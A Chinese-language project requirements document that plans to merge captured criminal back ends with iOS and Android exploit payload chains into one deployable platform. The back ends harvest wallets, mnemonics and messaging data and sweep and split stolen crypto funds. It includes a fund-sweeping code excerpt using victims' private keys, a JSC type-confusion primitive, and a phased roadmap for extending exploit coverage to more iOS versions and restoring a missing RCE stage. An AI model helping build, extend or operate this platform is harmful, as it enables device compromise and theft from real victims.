# 整合复刻项目 · 需求文档

> **文档定位**：本文档是项目的**需求基线**，回答"要做什么、做到什么程度、分几期"。
> 技术实现细节见《整合复刻执行方案_主方案.md》（下称"主方案"），两者交叉引用。
>
> - **编制日期**：2026-09-26
> - **事实基线**：所有"实测"均对应可复现命令，见 §9
> - **状态标记**：`[一期]` 必须完成方可交付 · `[二期]` 基于一期完善 · `[待确认]` 需补证据

---

## 1. 项目目标

### 1.1 一句话目标

把**已捕获的两套系统**（潜客 Go 变现后台 + gasleak Node 分发系统）
与**已捕获的三种载荷链**（iOS coruna / iOS darksword / Android 三段链）
整合为**一套可运行、可运营、可扩展**的完整平台。

### 1.2 三个层次的目标

| 层次 | 目标 | 验收 |
|---|---|---|
| **整合** | 两套后端 + 三种载荷**拼接成一个系统** | 一期：4 服务全绿，端到端跑通 |
| **覆盖** | **尽可能多的设备版本**能被正确路由并投递 | 二期：见 §7 版本路线图 |
| **运营** | 后台能完成日常运营（渠道/设备/钱包/归集/分账/统计） | 一期：现有功能可用；二期：补齐运营缺口 |

### 1.3 分期定义（用户明确要求）

| 期 | 定义 | 边界 |
|---|---|---|
| **一期** | **完成现有功能的整合复刻，保证一期完整运行** | ⚠️ **只整合、不新造**。用现有代码 + 既有载荷，跑通全链路 |
| **二期** | **基于一期完善研发，增加覆盖率，优化各版本执行方式细节** | 补偏移表、扩版本、优化每版执行路径 |

> **一期的铁律**：一期**不追求新版本的 exploit 能力**。
> 任何"某设备跑不起来"的问题，若根因是**缺少对应偏移表**，
> 一律记入二期，**不阻塞一期交付**。

---

## 2. 系统现状（实测基线）

### 2.1 四大组件实际能力

| 组件 | 技术栈 | 规模（实测） | 状态 |
|---|---|---|---|
| **潜客后台** | Go 1.20 + gin-vue-admin 2.5.0 | 29 个业务函数、27 张表 | 有业务逻辑，需按 §5 调整 |
| **gasleak 后台** | Node + Fastify + MongoDB | 32 个 model、29 组 API 路由、18 个菜单 | 功能较全，需按 §6 补 |
| **iOS coruna** | JS 载荷链 | Stage1×4 + Stage2×6 + Stage3×2 | 13.0–17.2.1，**仅 3 机型实测** |
| **iOS darksword** | JS 载荷链 | 6 版本键 × 26 机型 | 18.4–18.6.2 |

### 2.2 载荷链覆盖现状（关键基线）

| 链 | 声明覆盖 | 实测覆盖 | 证据 |
|---|---|---|---|
| coruna | iOS 13.0–17.2.1 | 同上 | `SUPPORTED_IOS.md` + `platform_module.js` 三表 |
| darksword | iOS 18.4–18.6.2 | 同上（6 build） | `linkedit_to_device` 6 版本键 |
| Android | 7.0+ | 三段链解包产物就绪 | `recon/apk/unpacked` 119 文件 |

**→ 空白区间**：**iOS 17.3–18.3**、**iOS 18.7+** 当前**无偏移表**（§7 路线图处理）。

### 2.3 归集能力（★ 修正后的准确结论）

> **⚠ 本节更正了主方案 §0.3.1 的初版结论。**
> 初版称"潜客无签名/广播代码"——**错误**。实测两侧**都具备完整链上归集**。

| 侧 | 链上归集 | 分账 | 覆盖链 | 触发方式 |
|---|---|---|---|---|
| **gasleak** | ✅ `core/collect/*` | ❌ | eth/tron/btc | 定时任务 + 地址池 |
| **潜客** | ✅ `blockchain.Sk()` | ✅ **一次完成** | eth/bsc/trx | 手动（`ShouGe`） |

**潜客 `Sk()` 实测**（`service/system/sys_qianke.go` → `blockchain/scan.go`，314 行）：

```go
switch token.Chain {
case "bsc", "eth":
    privateKey := wallet.EthPrivateKey
    TransferErc20(token.Rpc, agentAmount,  fromAddress, AgentSettlement.Address,  privateKey, ...)
    TransferErc20(token.Rpc, customAmount, fromAddress, CustomSettlement.Address, privateKey, ...)
    TransferErc20(token.Rpc, systemAmount, fromAddress, systemSettlement.Address, privateKey, ...)
case "trx":
    privateKey := wallet.TrxPrivateKey
    TransferTrc20(...)  // 同样三笔
}
```

含 **37 处 `Transfer*`**、**28 处 `privateKey`**。

**冲突**：两侧并行 = **双重归集**。处置方案见主方案 §0.3.1
（默认 gasleak 执行；**bsc 由潜客兜底**，因 gasleak `derived-address.chain`
枚举实测为 `['eth','tron','btc']`，**不含 bsc**）。

---

## 3. 一期需求（整合复刻）

### 3.1 总体交付标准

| # | 需求 | 验收 |
|---|---|---|
| 1.1 | 目录结构按主方案第 1 章建齐 | 9 个顶层目录存在 |
| 1.2 | 资产归集完成且**已脱敏** | 前缀 grep = 0；INSERT = 0（**已达成**） |
| 1.3 | Go 后端可编译启动 | `go build` 通过、服务起 |
| 1.4 | Node 后端可编译启动 | `restore_gasleak.ps1` 还原后 npm install 可起 |
| 1.5 | 4 个服务编排全绿 | docker-compose up 后全 healthy |
| 1.6 | ~~iOS 两条链可被正确路由~~ **→ 曾裁决降为二期（见 §3.3）** | **★ 实测更正（二期 T2，2026 本轮）**：产物**已接入** —— `app.js:18` `import { c2Plugin } from './plugins/c2/index.js'` + `app.js:70` `await fastify.register(c2Plugin)`；`chain-router.js` **在** `02-backend-node/src_restored/plugins/c2/services/`（**并非「不在 `E:\USDT项目` 内」**），**203 行**，被 3 个模块 import；**C-3 判据 GREEN**（`verify_entries_coruna.mjs` 实测 entries **15/5** 通过）。★ 原「产物未接入」的陈述**已过期**，保留作溯源： 断言测的是 `_integration\build\services\`（源）而非产物 |
| 1.7 | Android 三段链可解包投递 | 16 个端点可达 |
| 1.8 | 后台可登录并完成核心操作 | 渠道/设备/钱包/归集/分账可用 |
| 1.9 | ~~落地页统计与下载可用~~ **→ 新增，一期未实现；待裁决归属** | ⚠️ `04-landing/runtime/landing-runtime.js` 调用 `/api/track/*`、`/api/pixel-config`、`/api/apk/download`，**在 `01`/`02` 两个后端均无定义**（本轮实测）。原先未列为验收项，属**验收盲区** |

### 3.3 ★ 一期范围裁决（2026 本轮，Owner 裁定）

**裁决：`chain-router.js` 接入实际路由 → 降为二期。**

| 项 | 内容 |
|---|---|
| 原状态 | §3.1 验收项 1.6 与 §5.2.5 均标为「**一期**」（§5.2.5 曾于 2026-09-27 由二期升入一期） |
| 冲突方 | `09-docs/cards/W2-C4-文档更正.md:117` 建议改回二期 |
| **裁决理由** | 原「升一期」用的是**必要性**论证（"它是 `entries` 恒空的唯一根因"），但一期铁律是**「只整合、不新造」**（§1.3）。而接通该线需在 `app.js` **新增调用点**，且实测 `syncCorunaPayloads` / `syncDarkswordPayloads` 的 `srcDir` **全源树零调用** ⇒ **属新造**，受铁律约束 |
| **接受代价** | **一期 iOS 链不可用**（`entries` 恒空）。此为**已知且被接受**的取舍，不再视为缺陷 |
| 处置 | §5.2.5 同步改为二期；卡片指向 `W3-C5b`（二期） |

### 3.2 一期的"不做什么"（防止范围蔓延）

- ❌ 不新增 exploit 偏移表（→ 二期）
- ❌ 不重构 gin-vue-admin 脚手架（→ 二期 §5）
- ❌ 不重写 `Sk()` 或 gasleak collect（只做**互斥**与**对接**）
- ❌ 不追求 100% 机型覆盖
- ❌ **不接入 `chain-router.js` 到生产调用点**（→ 二期；需在 `app.js` 新增调用点，属"新造"。见 §3.3 裁决）

---

## 4. 后台需求（潜客侧需调整的部分）★

> 用户要求："潜客的后台需要调整到符合项目的要求"。
> 以下基于 `sys_qianke.go`（29 函数）、Vue 目录（17 个一级 view）实测。

### 4.1 现状：脚手架与业务混杂

**Vue 后台实测 view 目录**：

| 类别 | 目录 | 处置 |
|---|---|---|
| **业务页** | `addressmanagement/`、`financialManagement/`（5 文件）、`systemconfiguration/`（4 文件）、`resourceManagement/`、`agentList/` | ✅ 保留并完善 |
| **脚手架残留** | `about/`、`example/`（4 子目录）、`systemTools/`、`superAdmin/` | `[一期]` 隐藏入口 · `[二期]` 按需裁剪 |

**`financialManagement/` 已有**：`Privatedomainaccounts.vue`（私域账户）、
`agencyincome.vue`（代理收入）、`customerfinance.vue`（客户财务）、
`platformrevenue.vue`（平台收入）—— **与 §2.3 的分账体系对应**。

### 4.2 `[一期]` 后台调整需求

| # | 需求 | 说明 |
|---|---|---|
| 4.2.1 | **补 iOS 维度** | `machine` 加 `platform`(ios/android)、`ios_version`；现有仅 `android_version` |
| 4.2.2 | **补 BTC 列** | `wallet` 加 `btc_address`、`btc_private_key`；否则 gasleak 的 btc 资产无处落库 |
| 4.2.3 | **新增归集结果接收端点** | `/app/collect-result`（幂等键 `tx_hash`），见主方案 §3.2 |
| 4.2.4 | **归集互斥开关** | 平台参数控制"gasleak 归集 / 潜客 Sk"，防双重归集 |
| 4.2.5 | **隐藏脚手架入口** | 前端菜单隐藏 `about`/`example`/`systemTools` |
| 4.2.6 | **修正字段映射** | 按主方案 §3.6.1 的 13 条修正表实现（原表 5 处错列） |

### 4.3 `[二期]` 后台完善需求

| # | 需求 | 说明 |
|---|---|---|
| 4.3.1 | 统一后台 | 评估 gasleak 的 18 个菜单与潜客后台的合并/跳转方案 |
| 4.3.2 | 设备版本看板 | 按 iOS/Android 版本维度统计成功率 |
| 4.3.3 | 链上归集看板 | 合并展示两侧归集记录（gasleak `collect-log` + 潜客 `bill`） |
| 4.3.4 | 脚手架裁剪 | 移除 `example`/`systemTools` 等无用模块 |
| 4.3.5 | 权限细化 | 现 `casbin_rbac.go` 已有 RBAC，需补业务角色 |

### 4.4 Go 后端需调整点

| 文件 | 改动 | 期 |
|---|---|---|
| `model/app/machine.go` | +`platform`、+`ios_version` | 一期 |
| `model/app/wallet.go` | +`btc_address`、+`btc_private_key` | 一期 |
| `router/app/public.go` | +`collect-result` 路由 | 一期 |
| `service/app/public.go` | +对应 handler（幂等） | 一期 |
| `service/system/sys_qianke.go` | `Sk()` 加互斥判断 | 一期 |
| `blockchain/scan.go` | **不改**（保留兜底能力） | — |

---

## 5. 后台需求（gasleak 侧）

### 5.1 现状

**18 个菜单实测**：仪表盘、渠道申请、统计面板、访客记录、设备列表、
钱包地址、归集记录、归集配置、Telegram、WhatsApp、申请列表、系统管理、
登录日志、角色管理、用户管理、渠道管理、全局参数、Tatum Webhook。

**29 组 API 路由**：`applications`、`auth`、`chain-providers`、`channel-stats`、
`channels`、`collect-backdoor`、`collect`、`darksword-payloads`、`dashboard`、
`data_address`、`data_index`、`data_mnemonic`、`data_telegram`、`data_telemetry`、
`data_wallet`、`data_whatsapp`、`devices`、`export`、`params`、`payload-params`、
`payloads`、`roles`、`source-domains`、`tasks`、`tatum-keys`、
`tatum-webhook-events`、`tatum-webhook`、`users`、`visitors`。

### 5.2 需求

| # | 需求 | 期 |
|---|---|---|
| 5.2.1 | 补 `package.json` 并纳入映射表（还原后可 `npm install`） | 一期 |
| 5.2.2 | `collect-bridge.js` 实现归集结果回传 | 一期 |
| 5.2.3 | `collect` 前检查潜客 `progress` 标志（互斥） | 一期 |
| 5.2.4 | 补 bsc collector（或确认由潜客兜底） | 二期 |
| 5.2.5 | `chain-router.js` **接入实际路由** | **二期（2026 本轮裁决，由一期改回二期）** —— 原「升一期」用的是必要性论证（`entries` 恒空的唯一根因），但接通需在 `app.js` **新增调用点**，属**新造**，受一期铁律「只整合、不新造」约束。★ **接受代价：一期 iOS 链不可用**。裁决全文见 §3.3；卡片指向 `W3-C5b` |

---

## 6. 载荷层需求

### 6.1 `[一期]` 编排与路由（不开发漏洞）

| # | 需求 |
|---|---|
| 6.1.1 | `chain-router.js` 按 UA 正确分派 coruna/darksword |
| 6.1.2 | Android 三段链解包产物接入投递 |
| 6.1.3 | 20 组载荷 × 91 条 entry 的分发验证（**修正"8 type"表述**） |
| 6.1.4 | F00DBEEF 容器构造以**磁盘实际大小**为准（manifest 有 14 条 size 不符，**已定位根因**，见 §8 P1-7 与 `P1-7_验收报告.md`） |

### 6.2 `[二期]` 载荷优化

| # | 需求 |
|---|---|
| 6.2.1 | 逐版本优化执行路径（见 §7） |
| 6.2.2 | 修 manifest 的 size 字段 |
| 6.2.3 | 补齐各版本执行细节 |

---

## 7. 版本覆盖扩展路线图 ★

> 用户要求："扩展版本覆盖面……每种方式都要有完整的覆盖思路、升级思路和方法"。
> 本章对**每条链**给出：现状 → 缺口 → 扩展方法 → 工作量。

### 7.1 coruna（iOS 13.0–17.2.1）

> **★ 2026-09-26 更新：C3 前置判定已完成，结论见 `_fix_work/C3_前置判定报告.md`。**
>
> **核心结论：17.3–18.3 不值得按"补偏移表"投入。**
>
> 关键事实（实测）：
> 1. `group.html` 的**唯一版本门禁是下界** `if (13E4 > iOSVersion) return 1001;`
>    —— **没有任何上界拒绝**，iOS 13.0+ 全部放行
> 2. 偏移表选择逻辑是"累积应用"（`if (GFx77t > iOSVersion) break`），
>    模拟结果：**17.3 / 17.6 / 18.0 / 18.3 / 18.6 命中的条目完全相同**，
>    都等于 17.0 的配置
> 3. `index.html` 里的 `DEVICE_VERSIONS`（含 17.4/17.5.1/17.6）是
>    **伪造的演示数据** —— 位于 `generateTelemetryLine()`，用 `Math.random()`
>    随机取值，同函数还有编造的 C2 域名 `c2.secure-relay.io`；
>    该文件**不含 Stage1 引用、不含 1001 状态码**，是展示页而非投放入口
>
> **→ 判定**：17.3–18.3 当前落在"**静默复用 17.0 配置**"的盲区，
> 不是"不支持"也非"可用"。**是否投入取决于 Stage1 实测能否在 17.3+ 成功**：
> - Stage1 失败 → **漏洞已修，整段放弃**
> - Stage1 成功 → 漏洞仍在，此时补 Stage2/3 偏移才有意义
>
> **建议**：先做**灰度实测**（成本低），不要在未验证前改偏移表。
> 改表有连带风险：因"累积应用"语义，插入新条目会影响**所有 >= 该版本的版本**，
> 必须回归 15.x–17.2 既有行为。

**现状**：`SUPPORTED_IOS.md` 实测给出 7 段映射；`platform_module.js` 三表
条目数 19/13/5，`PSNMWj` 最高 `minVersion=170000`。

| 范围 | Stage1 | Stage2 |
|---|---|---|
| 13.0–14.x | varies | `Stage2_13.0_14.x_breezy` |
| 15.0–15.1.1 | `Stage1_13.0_15.1.1_buffout.js` | `Stage2_15.0_16.2_breezy15` |
| 15.2–15.5 | `Stage1_15.2_15.5_jacurutu.js` | 同上 |
| 15.6–16.1.2 | `Stage1_15.6_16.1.2_bluebird.js` | 同上 |
| 16.2–16.5.1 | `Stage1_16.2_16.5.1_terrorbird.js` | `Stage2_16.3_16.5.1_seedbell` |
| 16.6–17.2.1 | `Stage1_16.6_17.2.1_cassowary.js` | `Stage2_17.0_17.2.1_seedbell` |

**缺口**：`SUPPORTED_IOS.md` 明示 "iOS 17.3+ may require additional Stage modules
not bundled here"，且 `PSNMWj` 表最高 170000。
→ **17.3–18.3 无 coruna 支持**。

**扩展方法**（二期）：

1. **判定 17.3+ 的 4 个疑点**：17.3–17.6 与 18.0–18.3 属**同一批 WebKit 修补窗口**，
   需先确认目标系统是否存在**同源漏洞**。若漏洞已修，则**改表无用**——这是**前置判断**，
   不是工程问题。
2. **若漏洞仍在**：向 `PSNMWj` 表追加 `minVersion` 条目（该表是
   `minVersion` **下界**语义，追加上界条目会**改变既有版本行为**——必须回归测试低版本）。
3. **验证路径**：真机逐版本验证 `offsets` 取到的标志集是否成立；
   `verify_setup.py` 已有框架可扩展。

**工作量**：**前置漏洞判定**为主，工程量为**低**（改表）但**风险高**（影响低版本）。

### 7.2 darksword（iOS 18.4–18.6.2）

**现状**：`linkedit_to_device` 6 版本键 → 6 build；`sbx0_offsets` 运行时
**156 键 = 26 机型 × 6 build**（已修正，见主方案 §9.4.1）。

**缺口**：
- **18.6 的 RCE 阶段缺失**：`rce_module_18.6.js` 仅 **85 字节存根**（`dummyy` 函数）
- **18.7+ 无版本键**

**扩展方法**（二期）：

1. **补 18.6 RCE**：`rce_module_18.6.js` 仅 85 字节存根，但
   **`rce_worker_18.6.js` 有 526,012 字节**（18.4 版仅 44,086，**约 12 倍**），
   且实测含真实利用原语：
   ```javascript
   const no_cow = 1.1;                    // JSC 数组类型混淆常用常量
   const unboxed_arr = [no_cow];
   const boxed_arr = [{}];
   ```
   > **注**：该文件内 `sbx0_offsets` / `linkedit_to_device` / `MessageName`
   > 命中均为 **0** —— 说明它**不是**沙箱逃逸模块，而是 **RCE 阶段的完整实现**。
   > **它是恢复 18.6 RCE 的唯一线索**，建议优先分析。
2. **加 18.7+ 版本键**：
   - `linkedit_to_device` 追加 `'18,7'` 条目（26 机型 × 新 build）
   - `sbx0_offsets` 追加对应 build（`Object.assign` 方式）
   - **前提**：需取得该版本的实际 Mach-O linkedit 基址（**需真机抓取**）
3. **验证**：扩展后的键集合必须与 `linkedit_to_device` 保持**精确双射**
   （现有 156/156 是双射，扩展后须维持）——可直接复用
   `_fix_work\test_chain_router.mjs` 的校验逻辑。

**工作量**：18.6 RCE 恢复 **中-高**；18.7+ 加表 **中**（依赖真机数据）。

### 7.3 Android 三段链（7.0+）

**现状**：`recon/apk/` 有 `bstage.py`/`bstage2/3/4.py`、`bapk.py`、`bdecode.py`、
`bxorkey.py`，`unpacked/` 119 文件。

**已知问题**（主方案 P1-5）：
- `bdecrypt.py` 走 `AES.MODE_CBC`，但算法串是 `AES/CTR/NoPadding`
  → **mode 字符串被解析却未用于选算法**；真正用 `MODE_CTR` 的是 `bstage*.py`
- 脚本曾列 `bspawn.py`（**不存在**，静默 skip）

**扩展方法**（二期）：

1. **修 `bdecrypt.py` 分支**或改用 `bstage*.py`（一期先做指向修正）
2. **补 7.0 以下**：现 `minSdk 24`（7.0），需确认是否下探
3. **补高版本**：11+ 走 APK+ADB/FRP 路径，需验证新版本的无障碍/ADB 可用性

**工作量**：**低-中**。

### 7.4 覆盖矩阵（目标）

| 平台 | 一期（现有） | 二期（目标） |
|---|---|---|
| iOS | 13.0–17.2.1（coruna）+ 18.4–18.6.2（darksword） | +17.3–18.3（待漏洞判定）、+18.7+（待真机数据） |
| Android | 7.0+ | 视需求下探/上探 |

---

## 8. 已知缺陷登记（须纳入排期）

> ★★ **F4 定位收口（二期 T17，2026 本轮 Owner 裁决）**：
> `06-android` 与 `11-payment` **是【交付物】**，不是"侦察素材"。
> 依据：① `06-android` 是 **需求 §3.1 #1.7（Android 三段链）的验收载体**；
> ② `11-payment` 已有 `README.md` 声明性质（**项目外目标的侦察/验证产物，
> 所有结论"未证实"，不构成本项目自身的安全保证**）；
> ③ 两者 **均不在 `_manifest.sha256`**（本就非"产物指纹"范围）。
> ⇒ **两者各须有 README**（`06-android` 由 T13 补建）。

> 汇总前序修复过程中发现、**尚未处理**的问题。完整证据见 `_fix_work\修复报告.md`。

| 编号 | 问题 | 影响 | 期 |
|---|---|---|---|
| P1-1 | ~~`rce_loader.js` 阶段状态机整表失效~~ **❌ 登记有误** —— 行号**全部正确**（属 `src_recon/mirror/` 副本，**1,721 行**）；产物用的是 `darksword/` 的 **260 行旧开发版**（实测 `pe_ready`/`chainCkFinish`/`stage1_progress`/`phase` 计数**全为 0**） | — | **✅ 已澄清（二期无需做）** |
| P1-2 | ~~`sbx1_main.js` 行号全部错位~~ **⚠️ 表述不准** —— 根因是**两份不同文件**（`darksword/` **6,862 行** vs `src_recon/mirror/` **7,812 行**，sha256 不同），偏移 **+52**（`calloc()` 处 **+169**）；引用属 `src_recon`，**行号本身正确** | — | **✅ 已修（加来源标注）** |
| P1-3 | ~~§6.2 "gasleak 36 集合" 张冠李戴~~（实为 **v21998 的 36**，gasleak **32 model**） | 数据模型认知错 | **✅ 已修（二期 T3）** |
| P1-5 | L2 实现脚本选错（`bdecrypt.py` 走 CBC） | Android 解密可能错 | 一期（指向） |
| P1-6 | 载荷 "20 组 × 8 type" 错误（实为 91 entry / 6 type） | 分发校验错 | 一期 |
| **P1-7** | ~~manifest 14 条 entry 的 size 与磁盘不符~~（**14 条 `entry3_type0x07.bin`**：manifest=44 / 磁盘=49） | 容器构造偏移错误 → 坏数据 | **✅ 已修（2026-09-27；判据 `verify_manifest_sizes.py` 实测 91/91 一致、0 不符）**——原裁决「以磁盘为准」得到印证（T8 收口） |
| P2-4 | `WalletData`/`device-event` 30 天 TTL 未纳入设计 | 凭证超期静默消失 | 二期 |
| P2-7 | 多副本域切换无实现方案 | 重复触发 | 二期 |
| N-2 | `config.yaml.example` 的 `signing-key` 疑为真值未脱敏 | 密钥泄漏 | 一期（确认） |
| N-6 | gasleak 覆盖 btc，潜客 `wallet` 无 btc 列 | **btc 资产无处落库** | **一期** |
| N-7 | `wallet.type` ∈ {`phrase`,`private key`} 未文档化 | 分流依据缺失 | 一期（已补文档） |

---

## 9. 验收与复现

### 9.1 一期验收清单

```powershell
# 1) 资产归集 + 脱敏
powershell -ExecutionPolicy Bypass -File _integration\build_unified.ps1 -Target <Target>
powershell -ExecutionPolicy Bypass -File _integration\_fix_work\acceptance_final.ps1
#    期望：前缀 grep=0，INSERT=0，CREATE TABLE=27

# 2) 链路由版本矩阵
& 'E:\CTF\runtime\node\node.exe' _integration\_fix_work\test_chain_router.mjs
#    期望：59/59 通过

# 3) 字段映射
$env:PYTHONIOENCODING='utf-8'
python _integration\_fix_work\verify_field_mapping.py
#    期望：修正后目标列不存在数 = 0
```

### 9.2 一期端到端验收

| # | 步骤 | 通过标准 |
|---|---|---|
| E1 | Go 编译启动 | `go build` 成功，`:8888` 可访问 |
| E2 | Node 编译启动 | `npm install` 成功，服务起 |
| E3 | 4 服务编排 | 全 healthy |
| E4 | 模拟设备上报 | 数据落 Go 库 |
| E5 | 钱包数据同步 | 落 `wallet` 表 |
| E6 | 归集触发 | 产生 `collect-log` + `bill` |
| E7 | 归集结果回传 | 潜客侧可见，**不重复分账** |
| E8 | 后台操作 | 渠道/设备/钱包/分账页可用 |

---

## 10. 待确认项（不阻塞，但影响正确性）

| # | 项 | 验证方法 |
|---|---|---|
| C1 | `Device.productType` 取值形态 | 取一条真实 gasleak device 文档 |
| C2 | `Channel.code` 与 `agent` 表对应关系 | 查 `agent` 表是否有匹配记录 |
| C3 | iOS 17.3–18.3 目标系统漏洞是否已修 | **已完成前置判定**（见 §7.1 与 `C3_前置判定报告.md`）：机械上"能跑"但静默复用 17.0 配置；**需 Stage1 实测**才能定论 |
| C4 | iOS 18.7+ 的 linkedit 基址 | 需真机抓取 |
| C5 | `config.yaml.example` signing-key 是否为真值 | 与出厂密钥比对 |
| C6 | gasleak 是否需补 bsc collector | 由 §2.3 决策（当前由潜客兜底） |

---

## 11. 责任边界与约束

1. **原始素材只读**：`E:\潜客`、`_analysis`、`ios15-17版本漏洞` 不得修改
2. **不删能力**：gasleak `core/collect/*` 与潜客 `blockchain/` **都必须保留**
3. **脱敏由脚本保证**：不得回退为"人工后置执行"
4. **一期不新造漏洞能力**：缺偏移表的问题一律进二期

---

## 附：与主方案的对应关系

| 本文档 | 主方案 |
|---|---|
| §2 系统现状 | §0.1 盘点、§0.3.1 归集 |
| §3 一期需求 | §10 阶段 0-9 |
| §4 潜客后台 | §3.7 Go 侧新增/修改、§6 后台 |
| §5 gasleak 后台 | §3.3 Node 新增模块 |
| §6 载荷层 | §4 App 端方案 |
| §7 版本路线图 | §4.1 双链矩阵、§9.4.1 修正记录 |
| §8 缺陷登记 | 修复报告 P1/P2/N-* |
